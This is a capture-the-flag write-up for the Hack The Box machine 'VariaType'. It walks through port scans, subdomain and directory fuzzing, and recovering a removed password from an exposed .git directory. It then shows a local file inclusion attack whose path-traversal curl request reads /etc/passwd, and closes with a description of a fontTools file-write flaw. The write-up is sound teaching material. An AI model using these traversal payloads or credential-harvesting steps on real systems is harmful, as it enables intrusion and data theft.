---
layout: writeup
title: "HTB VariaType"
date: 2026-03-19
description: "Medium Linux box involving Git repository disclosure, LFI through a download endpoint, and a fontTools vulnerability allowing arbitrary file writes."
tags: [Box, medium, linux]
---

## Reconnaissance

A full TCP port scan is performed against the target to identify open services before running version detection.

```bash
nmap -p- --open -Pn -T4 --stats-every=5s 10.129.4.135 -oN basic_scan.txt
```

Only two open ports are found: SSH and HTTP. A version and script scan is run against them.

```bash
nmap -p21,80 -Pn -sCV -T4 --stats-every=5s 10.129.4.135 -oN full_scan.txt
```

![nmap version scan results for SSH and HTTP](/assets/images/variatype/Pasted-image-20260318233301.png)
*Service and version details for the two open ports*

A scan of the most common UDP ports is also run to rule out additional services.

```bash
sudo nmap 10.129.4.135 -F -sU
```

The target hostname is added to `/etc/hosts` so virtual hosts can be resolved correctly.

## Enumeration

The main webpage exposes an upload functionality for tools, which is noted as a potential attack path.

![upload functionality on the main webpage](/assets/images/variatype/Pasted-image-20260318234228.png)
*Tool upload feature identified on the main site*

### Virtual Host Discovery

Fuzzing for virtual hosts/subdomains reveals a `portal` vhost.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://variatype.htb -H 'Host:FUZZ.variatype.htb' -v -fs 169
```

Accessing this vhost presents a login page.

![login page on portal.variatype.htb](/assets/images/variatype/Pasted-image-20260319001341.png)
*Login page exposed on the portal subdomain*

### Git Repository Disclosure

Directory fuzzing against the portal reveals an exposed `.git` directory.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://portal.variatype.htb/FUZZ
```

> An exposed `.git` directory means the full version history of the application source code — including any commits that were later reverted or "fixed" — can be downloaded and reconstructed. This often reveals credentials or logic that was removed from the live codebase but still exists in history.

The repository's `HEAD` file is confirmed to be accessible.

```bash
curl -s http://portal.variatype.htb/.git/HEAD
```

![HEAD file content confirming exposed git repository](/assets/images/variatype/Pasted-image-20260319120352.png)
*Confirmation that the .git directory is publicly accessible*

The full repository is downloaded using [git-dumper](https://github.com/arthaud/git-dumper), a tool that reconstructs a working `.git` directory from an exposed web-accessible one.

```bash
python3 git-dump.py http://portal.variatype.htb/.git/
```

Reviewing the commit history shows two commits.

```bash
git log
```

![git log output showing two commits](/assets/images/variatype/Pasted-image-20260319120801.png)
*Commit history of the recovered repository*

Diffing the earlier commit reveals a chatbot password that was removed in a later commit.

```bash
git diff 753b5f5957f2020480a19bf29a0ebc80267a4a3d
```

![git diff revealing the chatbot password](/assets/images/variatype/Pasted-image-20260319121717.png)
*Diff showing the credential that was later removed from the codebase*

## Exploitation

### Local File Inclusion via Download Endpoint

Using the recovered credential, a login on `portal.variatype.htb` succeeds and a `PHPSESSID` cookie is issued. The application's use of `index.php` confirms it is built on PHP.

Common files and endpoints are enumerated with `ffuf`.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://portal.variatype.htb/FUZZ.php
```

This identifies a download feature.

![download functionality discovered on the portal](/assets/images/variatype/Pasted-image-20260319122447.png)
*Download endpoint exposed on the application*

Since uploading templates does not behave as expected, the download endpoint is targeted for a Local File Inclusion (LFI) vulnerability instead. Its parameters are enumerated:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://portal.variatype.htb/download.php?FUZZ=value' -H "Cookie: PHPSESSID=mpuh7d7qlnb3a9a76o60v6aq50" -fs 24
```

The parameter `f` is identified as the relevant one. The Jhaddix LFI wordlist is then used against it to confirm path traversal is possible.

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://portal.variatype.htb/download.php?f=FUZZ' -H "Cookie: PHPSESSID=mpuh7d7qlnb3a9a76o60v6aq50" -fs 15
```

![LFI confirmed against the download endpoint](/assets/images/variatype/Pasted-image-20260319123029.png)
*Successful LFI hits against the download.php endpoint*

The vulnerability is confirmed by reading `/etc/passwd` through a directory traversal payload.

```bash
curl 'http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd' -H "Cookie: PHPSESSID=mpuh7d7qlnb3a9a76o60v6aq50"
```

`/etc/passwd` highlights the user `steve` as a likely target, since SSH is open. No SSH key for this user is found through the LFI.

### fontTools Vulnerability

Reviewing the application's dependencies shows it uses `fontTools.varLib`. This library version is vulnerable to an [Arbitrary File Write and XML Injection issue](https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv). The vulnerability arises from unsafe parsing of font designspace/instance XML files, which can allow attacker-controlled paths to be written to during font compilation — providing a path toward arbitrary file write on the server.
